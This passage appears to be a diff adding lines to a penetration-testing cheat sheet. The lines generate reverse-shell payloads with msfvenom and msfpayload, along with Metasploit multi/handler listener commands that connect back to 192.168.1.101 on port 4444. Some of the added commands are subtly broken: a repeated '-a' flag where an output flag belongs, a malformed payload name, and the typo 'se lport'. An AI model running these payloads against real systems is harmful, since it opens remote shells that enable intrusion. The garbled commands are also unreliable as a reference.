@@ -26,6 +26,18 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f raw > sh
 # Exe
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=445 -f exe -o shell_reverse.exe
 
+
+
+msfvenom -p windows/x64/reverse_tcp --platform windows -a x86 -f exe lhost=192.168.1.101 lport=4444 -a /root/somewhere/hack.exe
+
+msfpayload windows/x64/meterpreter_tcp lhost=192.168.1.101 lport=4444 x > /root/somewhere/hack.exe
+use exploit/multi/handler
+set payload windows/x64/meterpreter_tcp
+set lhost 192.168.1.101
+se lport 4444
+show targets
+set target x
+run
 -----------------------------------------------------
 
 Interactive TTY Shell
